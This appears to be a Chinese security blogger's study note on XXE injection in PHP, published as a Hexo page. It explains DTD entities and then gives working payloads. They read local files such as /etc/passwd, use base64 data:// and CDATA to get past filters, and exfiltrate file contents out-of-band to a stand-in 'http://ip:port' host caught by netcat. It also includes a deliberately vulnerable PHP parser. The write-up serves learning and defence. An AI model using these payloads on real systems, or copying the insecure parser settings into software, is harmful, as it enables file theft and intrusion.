@@ -1,0 +1,379 @@
+
+ <!DOCTYPE HTML>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  
+    <title>XML学习 | buxqm</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Ycj">
+    
+    <meta name="description" content="XXE学习记录​    
+​    XXE也就是XML外部实体注入，这主要是DTD文件导致的。
+DTD简介​    文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。
+DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。假如 DTD 被包含在您">
+    
+    
+    
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/author.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/author.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+  <body>
+    <header>
+      <div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.svg" alt="buxqm" title="buxqm"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="buxqm">buxqm</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+					<li>
+					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:yoursite.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2020/06/30/XXE专题/" title="XML学习" itemprop="url">XML学习</a>
+  </h1>
+  <p class="article-author">By
+    
+      <a href="http://yoursite.com" title="Ycj">Ycj</a>
+    </p>
+  <p class="article-time">
+    <time datetime="2020-06-29T16:00:00.000Z" itemprop="datePublished">2020-06-30</time>
+    Updated:<time datetime="2020-07-02T15:23:21.054Z" itemprop="dateModified">2020-07-02</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE学习记录"><span class="toc-number">1.</span> <span class="toc-text">XXE学习记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DTD简介"><span class="toc-number">1.1.</span> <span class="toc-text">DTD简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#有回显的XXE"><span class="toc-number">1.2.</span> <span class="toc-text">有回显的XXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#无回显XXE"><span class="toc-number">1.3.</span> <span class="toc-text">无回显XXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考文献"><span class="toc-number">1.4.</span> <span class="toc-text">参考文献</span></a></li></ol></li></ol>
+		</div>
+		
+		<h1 id="XXE学习记录"><a href="#XXE学习记录" class="headerlink" title="XXE学习记录"></a>XXE学习记录</h1><p>​    </p>
+<p>​    XXE也就是XML外部实体注入，这主要是DTD文件导致的。</p>
+<h2 id="DTD简介"><a href="#DTD简介" class="headerlink" title="DTD简介"></a>DTD简介</h2><p>​    文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</p>
+<p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中： <code>&lt;!DOCTYPE 根元素名 [element-declarations]&gt;</code>，如果DTD位于XML源文件外，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 SYSTEM &quot;filename&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​    这个SYSTEM/PUBLIC关键字就是导致XXE注入的关键，经过研究JAVA解析DTD文件时，通过文件流将SYSTEM关键字后面的值当作URL读取文件，而JAVA文件流支持HTTP、FTP、JAR、FILE等等协议，在PHP中情况也类似，支持PHP伪协议、phar等等协议。</p>
+<p>​    在DTD中可以定义通用实体和参数实体。</p>
+<p>​    1、通用实体</p>
+<p>​    通用实体能在XML文档中引用，示例代码如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt; ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​    2、参数实体</p>
+<p>​    参数实体只能在DTD文件中引用，示例代码如下：</p>
+<p>test1.dtd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % in1 SYSTEM &quot;test2.dtd&quot;&gt;</span><br><span class="line">%in1;%out;</span><br></pre></td></tr></table></figure>
+
+<p>test2.dtd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % out &quot;&lt;!ENTITY writer &apos;111&apos;&gt;&quot; &gt;</span><br></pre></td></tr></table></figure>
+
+<p>​    关于DTD的基本知识就介绍到这里，接下来尝试一下XXE攻击，本文使用PHP环境。</p>
+<h2 id="有回显的XXE"><a href="#有回显的XXE" class="headerlink" title="有回显的XXE"></a>有回显的XXE</h2><p>首先搭建一个简单的解析XML文档的PHP服务,目标是读取flag.php文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();<span class="comment">//创建文档对象</span></span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);/指定解析器 </span><br><span class="line">    $creds = simplexml_import_dom($dom);<span class="comment">//将DOM对象转换成XML对象</span></span><br><span class="line">    <span class="keyword">echo</span> $creds;<span class="comment">//输出</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们这里主要探讨Data协议</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [  </span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "data://text/plain;base64,ZmlsZTovLy9DOi9waHBTdHVkeS9QSFBUdXRvcmlhbC9XV1cvZmxhZy5waHA="&gt;</span></span><br><span class="line"><span class="meta"> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://i.loli.net/2020/07/02/XtAH16oLrYkhCTb.png" alt></p>
+<p>经过data协议只能获取一些加密的值,并不能直接达到读取文件的效果，但是data协议的加密可以绕过许多关键字过滤，我的初步想法是将data协议读出来的数据拼凑出一个新的实体。</p>
+<p><img src="https://i.loli.net/2020/07/02/4rREZKu9dOz7JNv.png" alt></p>
+<p>直接拼凑失败了，SYSTEM后面的%xxe;直接被当成url解析了，于是尝试分步拼凑。</p>
+<p><img src="https://i.loli.net/2020/07/02/tBRa6jSh34fo9iZ.png" alt></p>
+<p>发现报错PEReferences forbidden in internal subset in Entity PEReferences 指的是参数实体引用(Parameter Entity Reference)，禁止在内部Entity中引用参数实体，那就用外部DTD试试。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE root [  </span><br><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;data://text/plain;base64,ZmlsZTovLy9DOi9waHBTdHVkeS9QSFBUdXRvcmlhbC9XV1cvZmxhZy5waHA=&quot;&gt;</span><br><span class="line">&lt;!ENTITY % out SYSTEM &quot;file:///C:/phpStudy/PHPTutorial/WWW/out.dtd&quot;&gt;</span><br><span class="line">%out;%all;</span><br><span class="line"> ]&gt; </span><br><span class="line">&lt;root&gt;&amp;a;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>out.dtd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY a SYSTEM &apos;%xxe;&apos;&gt;&quot; &gt;</span><br></pre></td></tr></table></figure>
+
+<p>理一下思路，首先在在payload中完成data协议信息读取，然后再外部dtd进行拼凑，最后再引用拼凑的实体进行文件读取，这样可以绕过许多WAF。</p>
+<p><img src="https://i.loli.net/2020/07/02/n1PUFQfeqpm4SEk.png" alt></p>
+<p>顺带一提，当文件中含有&gt;,%,&amp;等字符时，XML解析会报错，不能读取出文件内容，这是可以用CDATA来包裹文件内容，再CDATA中的数据不会被XML解析，也需要用到外部dtd，这里就直接放关键部分payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="无回显XXE"><a href="#无回显XXE" class="headerlink" title="无回显XXE"></a>无回显XXE</h2><p>关于dtd的引用技巧在上文已经介绍的很清楚了，之前说道SYSTEM/PUBLIC关键字实现原理是XML解析器对后面的url发起一次下载请求，我们可以首先使用<code>nc -lvv port</code>来监听端口，收到请求后就会成功的把文件信息带出，关键payload如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY % send SYSTEM &apos;http://ip:port?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当然，XXE注入技巧还有许多，本文就先分析到这里，之后再来补充。</p>
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://xz.aliyun.com/t/3357#toc-22" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-22</a> </p>
+<p><a href="https://www.freebuf.com/vuls/207639.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/207639.html</a> </p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/专题-XXE/">专题  XXE</a>
+</div>
+
+
+
+<div class="article-share" id="share">
+
+  <div data-url="http://yoursite.com/2020/06/30/XXE专题/" data-title="XML学习 | buxqm" data-tsina="" class="share clearfix">
+  </div>
+
+</div>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+
+<div class="next">
+<a href="/2020/06/30/JavaWeb专题/"  title="TomCat">
+ <strong>NEXT:</strong><br/> 
+ <span>TomCat
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+<section class="comment">
+	<div class="ds-thread"></div>
+</section>
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE学习记录"><span class="toc-number">1.</span> <span class="toc-text">XXE学习记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DTD简介"><span class="toc-number">1.1.</span> <span class="toc-text">DTD简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#有回显的XXE"><span class="toc-number">1.2.</span> <span class="toc-text">有回显的XXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#无回显XXE"><span class="toc-number">1.3.</span> <span class="toc-text">无回显XXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考文献"><span class="toc-number">1.4.</span> <span class="toc-text">参考文献</span></a></li></ol></li></ol>
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+			<li><a href="/categories/WebBook/" title="WebBook">WebBook<sup>0</sup></a></li>
+		
+			<li><a href="/categories/docker/" title="docker">docker<sup>1</sup></a></li>
+		
+			<li><a href="/categories/sql注入/" title="sql注入">sql注入<sup>1</sup></a></li>
+		
+			<li><a href="/categories/writeup/" title="writeup">writeup<sup>1</sup></a></li>
+		
+			<li><a href="/categories/xss学习/" title="xss学习">xss学习<sup>0</sup></a></li>
+		
+			<li><a href="/categories/专题-JavaWeb/" title="专题  JavaWeb">专题  JavaWeb<sup>1</sup></a></li>
+		
+			<li><a href="/categories/专题-XXE/" title="专题  XXE">专题  XXE<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  
+
+  <div class="rsspart">
+	<a href="" target="_blank" title="rss">RSS</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> Hello <br/>
+			似水流年</p>
+	</section>
+	 
+	<div class="social-font clearfix">
+		
+		
+		
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="Pacman">Pacman</a> © 2020 
+		
+		<a href="http://yoursite.com" target="_blank" title="Ycj">Ycj</a>
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina');
+  var html = [
+  '<a href="#" class="overlay" id="qrcode"></a>',
+  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#share"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
+  '<a href="#textlogo" class="article-back-to-top" title="Top"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="QRcode"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="Weibo"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+  $('.article-share-qrcode').click(function(){
+    var imgSrc = $('#qrcode-pic').attr('data-src');
+    $('#qrcode-pic').attr('src', imgSrc);
+    $('#qrcode-pic').load(function(){
+        $('.qrcode strong').text(' ');
+    });
+  });
+});     
+</script>
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:""};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+  </body>
+</html>
